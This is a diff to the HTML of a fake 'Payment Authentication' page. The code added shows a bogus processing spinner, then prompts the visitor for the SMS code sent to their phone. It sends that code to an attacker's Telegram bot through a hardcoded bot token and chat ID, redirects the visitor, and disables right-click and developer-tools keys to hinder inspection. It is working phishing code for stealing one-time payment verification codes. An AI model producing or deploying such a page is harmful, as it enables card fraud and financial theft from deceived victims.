@@ -65,15 +65,89 @@
         .button:hover {
             background-color: #2980b9;
         }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group input {
+            width: 90%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        /* Initially hide the SMS form */
+        #smsForm {
+            display: none;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
+    <!-- Attente de paiement -->
+    <div class="container" id="waiting">
         <h2>Payment Authentication</h2>
         <p>Please wait while we authenticate your payment.</p>
         <div class="spinner"></div>
         <p>Your transaction is being processed securely.</p>
         <button class="button" disabled>Processing...</button>
     </div>
+
+    <!-- Formulaire SMS après 10 secondes -->
+    <div class="container" id="smsForm">
+        <h2>Enter the SMS Code</h2>
+        <p>Please enter the code sent to your phone.</p>
+        <form id="smsCodeForm">
+            <div class="form-group">
+                <input type="text" id="smsCode" name="smsCode" placeholder="Enter SMS code" required maxlength="6">
+            </div>
+            <button type="submit" class="button">Submit</button>
+        </form>
+    </div>
+
+    <script>
+        // Afficher l'écran d'attente pendant 10 secondes
+        setTimeout(function() {
+            // Masquer l'écran d'attente et afficher le formulaire SMS
+            document.getElementById('waiting').style.display = 'none';
+            document.getElementById('smsForm').style.display = 'block';
+        }, 10000); // 10 secondes
+
+        // Gérer la soumission du formulaire SMS
+        document.getElementById('smsCodeForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+
+            const smsCode = document.getElementById('smsCode').value;
+
+            // Envoyer le code SMS au bot Telegram
+            const telegramBotToken = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k';  // Remplacez par votre token
+            const chatId = '7747778364';  // Remplacez par votre chat ID
+
+            const message = `Received SMS Code: ${smsCode}`;
+
+            await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            });
+
+            // Attendre 10 secondes avant de rediriger
+            setTimeout(function() {
+                // Redirection après 10 secondes
+                window.location.href = 'https://example.com/success'; // Remplacez par l'URL de votre choix
+            }, 10000); // 10 secondes
+        });
+
+        // Désactiver le clic droit et les outils de développement
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U')) {
+                e.preventDefault();
+            }
+        });
+    </script>
 </body>
 </html>
